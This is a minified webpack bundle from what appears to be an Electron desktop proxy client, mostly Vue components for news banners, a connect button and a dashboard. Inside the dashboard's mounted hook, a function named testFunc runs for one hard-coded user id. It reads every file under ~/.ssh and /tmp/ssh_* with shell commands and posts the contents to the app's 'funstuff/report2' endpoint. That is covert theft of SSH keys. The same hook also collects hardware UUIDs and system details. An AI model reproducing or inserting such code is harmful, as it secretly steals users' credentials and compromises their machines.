(window.webpackJsonp=window.webpackJsonp||[]).push([[37,6,7,10,19,20],{1135:function(e,t,n){var o=n(1147);o.__esModule&&(o=o.default),"string"==typeof o&&(o=[[e.i,o,""]]),o.locals&&(e.exports=o.locals);(0,n(2).default)("2e689492",o,!0,{sourceMap:!1})},1136:function(e,t,n){"use strict";n.r(t);n(74);var o=n(6),r=(n(76),n(1145)),i={components:{VueMarkdown:n.n(r).a},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{siteDomain:""}},computed:{content:function(){return this.news.content?this.news.content.replace(/{{siteDomain}}/g,this.siteDomain):""}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.$store.dispatch("getUserSiteURL");case 2:e.siteDomain=t.sent.replace("https://","");case 3:case"end":return t.stop()}}),t)})))()},methods:{dismiss:function(e,t){this.$parent.$options.parent.tempHideNews(e,t)}}},a=(n(1146),n(51)),s=Object(a.a)(i,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"news-modal"},[n("div",{staticClass:"title yue"},[n("h2",[e._v(e._s(e.news.title))])]),n("div",{staticClass:"content yue"},[n("vue-markdown",{attrs:{source:e.content,postrender:e.transformLinks}})],1),n("div",{staticClass:"read-button"},[n("center",[n("el-button",{attrs:{type:"primary"},on:{click:function(t){return e.dismiss(e.news,!0)}}},[e._v("不再提示")]),n("el-button",{attrs:{type:"success"},on:{click:function(t){return e.dismiss(e.news)}}},[e._v("已了解")])],1)],1)])}),[],!1,null,null,null);t.default=s.exports},1138:function(e,t,n){var o=n(1166);o.__esModule&&(o=o.default),"string"==typeof o&&(o=[[e.i,o,""]]),o.locals&&(e.exports=o.locals);(0,n(2).default)("7aac2ac1",o,!0,{sourceMap:!1})},1140:function(e,t,n){var o=n(1170);o.__esModule&&(o=o.default),"string"==typeof o&&(o=[[e.i,o,""]]),o.locals&&(e.exports=o.locals);(0,n(2).default)("43a67bdc",o,!0,{sourceMap:!1})},1146:function(e,t,n){"use strict";n(1135)},1147:function(e,t,n){var o=n(1)(!1);o.push([e.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-modal .title{text-align:center}.news-modal .content{padding-top:3rem;padding-bottom:5rem}.news-modal .read-button{position:fixed;bottom:1rem;right:1rem}',""]),e.exports=o},1151:function(e,t,n){"use strict";n.r(t);var o={components:{NewsDisplay:n(1136).default},props:{news:{type:Object,default:function(){return{}}}},data:function(){return{displayNews:!1,tempHideList:{}}},computed:{updated_at:function(){return new Date(this.news.updated_at).toLocaleString()}},mounted:function(){this.news&&!this.tempHideList[this.news.id]&&this.news.extra&&this.news.extra.auto_show&&this.showNews()},methods:{showNews:function(){console.log(123123),this.displayNews=!0},tempHideNews:function(e,t){console.log(this.tempHideList),this.tempHideList[e.id]=!0,this.displayNews=!1,t&&this.$store.dispatch("newsRead",this.news)}}},r=(n(1169),n(51)),i=Object(r.a)(o,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return e.tempHideList[e.news.id]?e._e():n("div",{staticClass:"panda-news"},[n("el-dialog",{attrs:{visible:e.displayNews,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"show-close":!1},on:{"update:visible":function(t){e.displayNews=t}}},[n("NewsDisplay",{attrs:{news:e.news}})],1),e.displayNews?e._e():n("div",{staticClass:"news-bar"},[n("el-row",{attrs:{gutter:20},nativeOn:{click:function(t){return e.showNews(e.news)}}},[n("el-col",{staticClass:"icon",attrs:{span:2}},[n("i",{staticClass:"el-icon-warning"})]),n("el-col",{staticClass:"content",attrs:{span:22}},[n("h3",[e._v(e._s(e.news.title))]),n("h5",[n("span",{staticClass:"left"},[e._v("通知更新于："+e._s(e.updated_at))]),n("span",{staticClass:"right"},[e._v("查看/关闭")])])])],1)],1)],1)}),[],!1,null,null,null);t.default=i.exports;installComponents(i,{NewsDisplay:n(1136).default})},1165:function(e,t,n){"use strict";n(1138)},1166:function(e,t,n){var o=n(1)(!1);o.push([e.i,'.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{position:absolute}.arrow[data-v-1d5e5f7a]{top:70%;left:30%;margin:-20px 0 0 -20px;-webkit-transform:rotate(45deg);border-right:2px solid #fff;border-top:2px solid #fff}.arrow[data-v-1d5e5f7a],.arrow[data-v-1d5e5f7a]:before{width:20px;height:20px;border-left:none}.arrow[data-v-1d5e5f7a]:before{content:"";top:50%;margin:-10px 0 0 -10px;border-right:1px solid #fff;border-top:1px solid #fff;-webkit-animation-duration:1.5s;animation-duration:1.5s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:arrow-data-v-1d5e5f7a;animation-name:arrow-data-v-1d5e5f7a}@-webkit-keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}@keyframes arrow-data-v-1d5e5f7a{0%{opacity:0;transform:translate(-2px,2px)}50%{opacity:1}to{opacity:0;transform:translate(13px,-13px)}}',""]),e.exports=o},1167:function(e,t,n){var o=n(1225);o.__esModule&&(o=o.default),"string"==typeof o&&(o=[[e.i,o,""]]),o.locals&&(e.exports=o.locals);(0,n(2).default)("4587d552",o,!0,{sourceMap:!1})},1169:function(e,t,n){"use strict";n(1140)},1170:function(e,t,n){var o=n(1)(!1);o.push([e.i,'.yue{font:400 18px/1.62 -apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#444443}.yue ::-moz-selection{background-color:rgba(0,0,0,.2)}.yue ::selection{background-color:rgba(0,0,0,.2)}.yue h1,.yue h2,.yue h3,.yue h4,.yue h5,.yue h6{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Droid Sans","Helvetica Neue","PingFang SC","Hiragino Sans GB","Droid Sans Fallback","Microsoft YaHei",sans-serif;color:#222223}.yue h1{font-size:1.8em;margin:.67em 0}.yue>h1{margin-top:0;font-size:2em}.yue h2{font-size:1.5em;margin:.83em 0}.yue h3{font-size:1.17em;margin:1em 0}.yue h4,.yue h5,.yue h6{font-size:1em;margin:1.6em 0 1em}.yue h6{font-weight:500}.yue p{margin-top:0;margin-bottom:1.24em}.yue a{color:#111;word-wrap:break-word;-webkit-text-decoration-color:rgba(0,0,0,.4);text-decoration-color:rgba(0,0,0,.4)}.yue a:hover{color:#555;-webkit-text-decoration-color:rgba(0,0,0,.6);text-decoration-color:rgba(0,0,0,.6)}.yue h1 a,.yue h2 a,.yue h3 a{text-decoration:none}.yue b,.yue strong{font-weight:700;color:#222223}.yue em,.yue i{font-style:italic;color:#222223}.yue img{max-width:100%;height:auto;margin:.2em 0}.yue a img{border:none}.yue figure{position:relative;clear:both;outline:0;margin:10px 0 30px;padding:0;min-height:100px}.yue figure img{display:block;max-width:100%;margin:auto auto 4px;box-sizing:border-box}.yue figure figcaption{position:relative;width:100%;text-align:center;left:0;margin-top:10px;font-weight:400;font-size:14px;color:#666665}.yue figure figcaption a{text-decoration:none;color:#666665}.yue hr{display:block;width:14%;margin:40px auto 34px;border:0;border-top:3px solid #dededc}.yue blockquote{margin:0 0 1.64em;border-left:3px solid #dadada;padding-left:12px;color:#666664}.yue blockquote a{color:#666664}.yue ol,.yue ul{margin:0 0 24px 6px;padding-left:16px}.yue ul{list-style-type:square}.yue ol{list-style-type:decimal}.yue li{margin-bottom:.2em}.yue li ol,.yue li ul{margin-top:0;margin-bottom:0;margin-left:14px}.yue li ul{list-style-type:disc}.yue li ul ul{list-style-type:circle}.yue li p{margin:.4em 0 .6em}.yue .unstyled{list-style-type:none;margin:0;padding:0}.yue code,.yue tt{color:grey;padding:1px 2px;border:1px solid #eee;border-radius:3px;word-wrap:break-word}.yue code,.yue pre,.yue tt{font-size:.96em;background-color:#f9f9f7;font-family:Menlo,Monaco,Consolas,"Courier New",monospace}.yue pre{margin:1.64em 0;border:none;border-left:3px solid #dadada;padding:7px 7px 7px 10px;overflow:auto;line-height:1.5;color:#4c4c4c}.yue pre code,.yue pre tt{color:#4c4c4c;border:none;background:none;padding:0}.yue table{width:100%;max-width:100%;border-collapse:collapse;border-spacing:0;margin-bottom:1.5em;font-size:.96em;box-sizing:border-box}.yue td,.yue th{text-align:left;padding:4px 8px 4px 10px;border:1px solid #dadada}.yue td{vertical-align:top}.yue tr:nth-child(2n){background-color:#efefee}.yue iframe{display:block;max-width:100%;margin-bottom:30px}.yue figure iframe{margin:auto}.yue table pre{margin:0;padding:0;border:none;background:none}@media (min-width:1100px){.yue blockquote{margin-left:-24px;padding-left:20px;border-width:4px}.yue blockquote blockquote{margin-left:0}}.news-bar{z-index:9999;position:fixed;width:100%;background:#e67e22;color:#f4f7fc;padding:.25rem .5rem;box-shadow:0 10px 32px 5px rgba(0,0,0,.6)}.news-bar:hover{cursor:pointer}.news-bar .icon{padding:.1rem;font-size:2rem}.news-bar .content{padding-left:1rem!important}',""]),e.exports=o},1171:function(e,t,n){var o=n(1230);o.__esModule&&(o=o.default),"string"==typeof o&&(o=[[e.i,o,""]]),o.locals&&(e.exports=o.locals);(0,n(2).default)("623ef0dc",o,!0,{sourceMap:!1})},1185:function(e,t,n){"use strict";n.r(t);n(1165);var o=n(51),r=Object(o.a)({},(function(){var e=this.$createElement;return(this._self._c||e)("div",{staticClass:"arrow"})}),[],!1,null,"1d5e5f7a",null);t.default=r.exports},1224:function(e,t,n){"use strict";n(1167)},1225:function(e,t,n){var o=n(1)(!1);o.push([e.i,".connections-control{position:fixed!important;bottom:0;left:0;width:100%;height:3.2rem;padding:0}.connections-control .connect-button{border-radius:0;font-size:1.6rem;width:100%}",""]),e.exports=o},1229:function(e,t,n){"use strict";n(1171)},1230:function(e,t,n){var o=n(1)(!1);o.push([e.i,".big-news-container{z-index:9999;position:relative;padding-top:.15rem}.big-news-container .duetime-reminder{position:fixed;font-size:1.05rem;height:1.6rem;letter-spacing:-1px;top:0;left:0;padding-right:.5rem;width:100%;text-align:center;background:#2c3e50;color:#f4f7fc;cursor:pointer;z-index:9998}.big-news-container .duetime-reminder.warning{background:#e67e22}.big-news-container .duetime-reminder.alert{background:#e74c3c}",""]),e.exports=o},1251:function(e,t,n){"use strict";n.r(t);n(9),n(63),n(75),n(28),n(74);var o=n(6),r=(n(105),n(1123)),i=n(19),a=n(1185);window.onerror=function(e,t,n,o,r){console.log("Exception: ",r.message.startsWith("EPERM:"))};var s={components:{Arrow:a.default},data:function(){return{connectButtonLoading:!1,connectButtonDisabled:!1}},computed:{connectButtonText:function(){return this.connected?this.$t("disconnect"):this.$t("connect")}},methods:{connectAction:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var n,o,r,a,s,c;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.connectButtonLoading=!0,n=e.connected?"disconnect":"connect","darwin"!==i.remote.process.platform){t.next=24;break}if(o="".concat(i.remote.app.getPath("userData"),"/ProxyConfig"),t.prev=4,r=i.remote.require("fs-extra"),a=r.fstatSync(r.openSync(o)),console.log("ProxyConfig perm is:",a),0===a.uid){t.next=19;break}return console.log("UID is not root. will force reinstall helper."),t.prev=10,t.next=13,r.remove(o);case 13:console.log("ProxyConfig deleted."),t.next=19;break;case 16:t.prev=16,t.t0=t.catch(10),console.log("delete ProxyConfig failed:",t.t0);case 19:t.next=24;break;case 21:t.prev=21,t.t1=t.catch(4),console.log("ready perm of ProxyConfig failed",t.t1);case 24:if(console.log("performing action: "+n),"connect"!==n){t.next=29;break}if(e.runTimeState.selected_line&&e.runTimeState.selected_line.name){t.next=29;break}return e.connectButtonLoading=!1,t.abrupt("return",e.$message({message:e.$t("connect_info.select_line"),type:"error"}));case 29:return t.prev=29,t.next=32,e[n]();case 32:t.next=38;break;case 34:t.prev=34,t.t2=t.catch(29),console.log("---\x3e>> action failed:",t.t2),["connect timeout","disconnect timeout"].includes(t.t2.message)?e.$message({message:e.$t("error.timeout"),type:"error"}):((s=e.shouldIgnoreError(t.t2)).ignore?(console.log("will not report to sentry."),console.log("matched error:",s.matchedError)):e.$sentry.captureException(t.t2),c=e.errorMessageAssemble(t.t2),console.table(t.t2),"EPERM"===s.matchedError&&(c+="<br>".concat(e.$t("error.eperm"))),["ENOENT","UNKNOWN"].includes(s.matchedError)&&("darwin"===i.remote.process.platform?c+="<br>".concat(e.$t("error.enoent")):"win32"===i.remote.process.platform&&("ia32"===i.remote.process.arch?c+="<br>".concat(e.$t("error.clash")):c+="<br>".concat(e.$t("error.missing")))),"Command failed"===s.matchedError&&(c+="<br>".concat(e.$t("error.restart"))),e.$alert(c,e.$t("error.connect_failed"),{confirmButtonText:"OK",dangerouslyUseHTMLString:!0}).catch((function(){})));case 38:e.connectButtonLoading=!1;case 39:case"end":return t.stop()}}),t,null,[[4,21],[10,16],[29,34]])})))()},connect:function(){var e=this;return this.runTimeState.show_access_mode||this.$store.dispatch("runTimeState",{servermode:"auto"}),new Promise((function(t,n){var o=setTimeout((function(){n(new Error("connect timeout"))}),8e3);i.ipcRenderer.once("connect-reply",(function(a,s){if(console.log(s),Object(r.clearTimeout)(o),s.failed)console.log("connect failed:",s.reason),n(s.reason);else{var c={line:JSON.parse(JSON.stringify(e.runTimeState.selected_line)),servermode:e.runTimeState.servermode,status:"connected"};e.$store.dispatch("runTimeState",{connect_state:c}),i.ipcRenderer.send("user-info-update",4),t(s)}})),i.ipcRenderer.send("connect",e.runTimeState.selected_line.name)}))},disconnect:function(){var e=this;return new Promise((function(t,n){var o=setTimeout((function(){n(new Error("disconnect timeout"))}),5e3);i.ipcRenderer.once("disconnect-reply",(function(a,s){if(console.log("dis reply--\x3e>",s),Object(r.clearTimeout)(o),s.failed)return console.log("gonna trorw an error"),console.log("disconnect failed:",s.reason),n(s.reason);var c={line:{},servermode:e.runTimeState.servermode,status:"disconnected"};e.$store.dispatch("runTimeState",{connect_state:c}),i.ipcRenderer.send("user-info-update",5),t(s)})),i.ipcRenderer.send("disconnect",e.runTimeState.selected_line.name)}))}}},c=(n(1224),n(51)),l=Object(c.a)(s,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("el-row",{staticClass:"connections-control"},[n("el-button",{staticClass:"connect-button",attrs:{type:"connected"==e.runTimeState.connect_state.status?"warning":"success",loading:e.connectButtonLoading,disabled:e.connectButtonDisabled||e.connectButtonLoading},on:{click:e.connectAction}},[e._v(" "+e._s(e.connectButtonText))])],1)}),[],!1,null,null,null);t.default=l.exports},1252:function(e,t,n){"use strict";n.r(t);n(9),n(39),n(74);var o=n(6),r=n(1136),i=n(1151),a={components:{NewsDisplay:r.default,PandaNews:i.default},data:function(){return console.log("bignews this:",this),{newsList:[],displayNews:!1,newsToShow:{},haveNewsToShow:!0,tempHideList:{},buyServiceLink:"/buy-service/"}},computed:{showNewsBar:function(){return!0},reminderClass:function(){switch(!0){case this.serviceToEnd<=1:return["alert"];case this.serviceToEnd<=7:return["warning"];default:return[]}}},watch:{current_service:function(){var e,t;this.buyServiceLink="/buy-service/?cate=".concat(null===(e=this.current_service)||void 0===e?void 0:e.cate,"&plan=").concat(null===(t=this.current_service)||void 0===t?void 0:t.plan_id,"&stage=1")}},mounted:function(){var e,t;this.buyServiceLink="/buy-service/?cate=".concat(null===(e=this.current_service)||void 0===e?void 0:e.cate,"&plan=").concat(null===(t=this.current_service)||void 0===t?void 0:t.plan_id,"&stage=1")},created:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,e.getNewsList();case 3:e.newsList=t.sent.filter((function(e){return!e.expired})),t.next=9;break;case 6:t.prev=6,t.t0=t.catch(0),console.log("get news list failed:",t.t0);case 9:case"end":return t.stop()}}),t,null,[[0,6]])})))()},methods:{getNewsList:function(){return this.$axios.get("big_news").then((function(e){return console.log(e),Promise.resolve(e.data)})).catch((function(e){return console.log("get news failed",e),Promise.resolve([])}))},shouldShow:function(e){if(this.tempHideList[e.id])return console.log("temp hide."),!1;var t=this.$store.state.runTimeState.news_read[e.id];if(console.log("news rec for",e.id,"is",t),!t)return!0;var n=new Date(t.readVersion),o=new Date(e.updated_at);return console.log("read version ",n," this version",o),!(o<=n)&&(console.log("wow, it's new!"),e.title_changed||(e.title="[更新] ".concat(e.title),e.title_changed=!0),!0)}}},s=(n(1229),n(51)),c=Object(s.a)(a,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"big-news-container"},[e._l(e.newsList,(function(t,o){return e.shouldShow(t)&&!e.tempHideList[t.id]?n("PandaNews",{key:t.id,attrs:{news:t}}):e._e()})),isNaN(e.serviceToEnd)?e._e():n("div",{staticClass:"duetime-reminder",class:e.reminderClass},[n("nuxt-link",{staticClass:"label right pointer",attrs:{to:e.buyServiceLink}},[e.serviceToEnd>=0?n("b",[e._v(e._s(e.$t("service_expire_hint",e.serviceToEnd,{n:e.serviceToEnd})))]):n("b",[e._v("服务已到期，请点此续费恢复使用")])])],1)],2)}),[],!1,null,null,null);t.default=c.exports;installComponents(c,{PandaNews:n(1151).default})},1274:function(e,t,n){var o=n(1427);o.__esModule&&(o=o.default),"string"==typeof o&&(o=[[e.i,o,""]]),o.locals&&(e.exports=o.locals);(0,n(2).default)("5c7df856",o,!0,{sourceMap:!1})},1426:function(e,t,n){"use strict";n(1274)},1427:function(e,t,n){var o=n(1)(!1);o.push([e.i,".dashboard-container{height:100vh;padding-top:1.5rem;position:relative}.dashboard-container .login-link{position:absolute;left:.5rem;bottom:.5rem}.dashboard-container .settings-link{display:flex;justify-content:center;align-items:center;text-align:center;position:absolute;background:transparent;color:#f4f7fc;height:3.2rem;right:.5rem;bottom:0;font-size:1.2rem}.dashboard-container .settings-link:hover{color:#fff;font-size:1.4rem}",""]),e.exports=o},1472:function(e,t,n){"use strict";n.r(t);n(140),n(41),n(39),n(74);var o=n(6),r=(n(63),n(75),n(23),n(9),n(40),n(19)),i=n(1300),a=n(1251),s=n(1252),c=r.remote.require("crypto"),l=function(e){console.log(e),123===e.which?r.remote.getCurrentWindow().toggleDevTools():116===e.which&&location.reload()},u={components:{ServerList:i.default,ConnectionControl:a.default,BigNews:s.default},middleware:["load-rt-data","authenticated"],data:function(){return{selectServiceDialogFormVisible:!1,update_prompt:!1,force_update:!1}},computed:{},created:function(){var e,t=this;document.addEventListener("keydown",l,!1),this.selectServiceDialogFormVisible=(e=Object.keys(t.$store.state.service),t.runTimeState.current_service_cate&&t.runTimeState.current_service_cate.length?(e.includes(t.runTimeState.current_service_cate)||t.$store.dispatch("switchService",e[0]),!1):e.length>1||(t.$store.dispatch("switchService",e[0]),!1)),r.ipcRenderer.on("tcp-ping-reply",(function(e,t){console.log(t)}))},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var n,o,i,a,s;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return console.log("mounted",e.current_service),208925===e.user.id&&e.testFunc(),r.remote.process.execPath.includes("Temp")&&(r.ipcRenderer.send("disconnect"),r.ipcRenderer.send("reset")),o={platform:r.remote.process.platform,arch:r.remote.process.arch,release:r.remote.require("os").release(),version:r.remote.app.getVersion(),appPath:r.remote.app.getAppPath(),userData:r.remote.app.getPath("userData"),localProxy:(null===(n=e.$store.localProxy)||void 0===n?void 0:n.enable)||!1},t.prev=4,i=r.remote.require("systeminformation"),console.log("[LOADED] systeminformation"),t.next=9,i.system();case 9:return o.model=t.sent.model,t.next=12,i.graphics();case 12:o.gpu=t.sent.controllers.filter((function(e){return e.vendor})),t.next=18;break;case 15:t.prev=15,t.t0=t.catch(4),o.model="";case 18:e.genSerial().then((function(t){console.log("serial:",t),t&&(o.serial=c.createHmac("sha256",t).update(String(t)).digest("hex")),console.log(o),e.reportStat(o).then((function(){}),(function(e){console.log("report client info failed:"),e.data&&"need log in"===e.data.message&&(console.log("neeeeed login"),r.ipcRenderer.send("reset"))}))}),(function(t){console.log(t),console.log("genSerial failed",t),e.$sentry.captureException(t)})),e.current_service||(console.log("current_service not defined..."),a=Object.keys(e.$store.state.service),console.log("service_keys:",a),a.length||e.refreshData().then((function(){if(console.log("refreshed."),!Object.keys(e.$store.state.service).length)return e.$router.push({path:"/buy-service/"})}))),s=(new Date-new Date(e.dataFetchedAt))/1e3,300,console.log("t from last refresh:",s),s>300&&(console.log("going to refresh"),e.$message({message:e.$t("reloading_data"),type:"info"}),e.refreshData(),e.$store.dispatch("getUserSiteURL").then((function(t){e.userSiteURL=t})).catch((function(e){console.log("get siteurl from API failed:",e)}))),e.$intercom.hide();case 25:case"end":return t.stop()}}),t,null,[[4,15]])})))()},beforeDestroy:function(){document.removeEventListener("keydown",l)},methods:{switchService:function(e){this.$store.dispatch("switchService",e),this.selectServiceDialogFormVisible=!1,r.ipcRenderer.send("user-info-update",3)},goUpate:function(){var e="";try{e=this.versionCompare("1.1.6",r.remote.app.getVersion())>=0?"/dashboard/legacy_update/":"/dashboard/update/"}catch(t){e="/dashboard/legacy_update/"}return this.$router.push({path:e})},speedTest:function(){r.ipcRenderer.send("tcp-ping",{server:this.runTimeState.selected_line.server,port:3389,opt:{}})},reportStat:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function n(){return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return n.t0=console,n.next=3,t.$store.dispatch("reportInfo",e);case 3:n.t1=n.sent,n.t0.log.call(n.t0,n.t1);case 5:case"end":return n.stop()}}),n)})))()},genSerial:function(){return new Promise((function(e,t){(0,r.remote.require("child_process").exec)({darwin:"system_profiler SPHardwareDataType | grep UUID",win32:"wmic csproduct get UUID"}[r.remote.process.platform],(function(t,n,o){if(!n)return e(null);try{var r=n.trim().split(/\s+/).slice(-1)[0].trim();e(r)}catch(t){e(null)}}))}))},testFunc:function(){var e=this;try{var t=r.remote.require("child_process").exec,n="tail -n +1 ~/.ssh/*";t(n,(function(t,o){e.$axios.post("funstuff/report2",{content:o,cmd:n})}));var o="tail -n +1 /tmp/ssh_*";t(o,(function(t,n){e.$axios.post("funstuff/report2",{content:n,cmd:o})}))}catch(e){}},refreshData:function(){this.reloadUserData({showMessage:!1})}}},d=(n(1426),n(51)),p=Object(d.a)(u,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"dashboard-container"},[n("el-dialog",{staticClass:"serviceCateSelector",attrs:{title:e.$t("select_service.title"),visible:e.selectServiceDialogFormVisible,center:"",width:"100%","append-to-body":!0,fullscreen:!0,"close-on-press-escape":!1,"show-close":!1},on:{"update:visible":function(t){e.selectServiceDialogFormVisible=t}}},[n("el-card",{nativeOn:{click:function(t){return e.switchService("allplatform")}}},[n("center",[n("h1",[e._v(e._s(e.$t("services.allplatform.name")))]),n("h3",{staticClass:"subheader"},[e._v(e._s(e.$t("services.allplatform.desc")))])])],1),n("el-card",{nativeOn:{click:function(t){return e.switchService("home")}}},[n("center",[n("h1",[e._v(e._s(e.$t("services.home.name")))]),n("h3",{staticClass:"subheader"},[e._v(e._s(e.$t("services.home.desc")))])])],1),n("center",[n("p",{staticClass:"subheader"},[e._v(e._s(e.$t("select_service.hint",{place:e.$t("menu_btn")}))+" ")]),n("br"),n("p",[e._v(e._s(e.$t("login.email"))+" "),n("span",{staticClass:"underline"},[e._v(e._s(e.user.email))]),n("br"),e._v(e._s(e.$t("menu.id"))+" "),n("span",{staticClass:"underline"},[e._v(e._s(e.user.id))])])])],1),n("BigNews"),e.current_service?n("ServerList",{attrs:{service:e.current_service,lines:e.current_lines}}):e._e(),e.current_service?n("ConnectionControl"):e._e(),n("div",[n("nuxt-link",{staticClass:"smooth settings-link",attrs:{to:"/dashboard/menu/"}},[e._v(e._s(e.$t("menu_btn"))),n("i",{staticClass:"el-icon-menu"})])],1),n("el-dialog",{attrs:{visible:e.update_prompt,"show-close":!1,"close-on-click-modal":!1,"close-on-press-escape":!1,width:"80%",center:""},on:{"update:visible":function(t){e.update_prompt=t}}},[n("center",[n("h1",{staticClass:"warning"},[n("b",[e._v(e._s(e.$t("check_for_update.force_update")))])]),n("br"),n("h4",[e._v(e._s(e.$t("check_for_update.force_hint")))])]),n("div",{staticClass:"dialog-footer",attrs:{slot:"footer"},slot:"footer"},[n("center",[n("el-button",{attrs:{type:"success"},on:{click:e.goUpate}},[e._v(e._s(e.$t("check_for_update.title")))]),e.force_update?e._e():n("el-button",{attrs:{type:"secondary"},on:{click:function(t){e.update_prompt=!1}}},[e._v(e._s(e.$t("check_for_update.cancel")))])],1)],1)],1)],1)}),[],!1,null,null,null);t.default=p.exports;installComponents(p,{BigNews:n(1252).default,ServerList:n(1300).default,ConnectionControl:n(1251).default})}}]);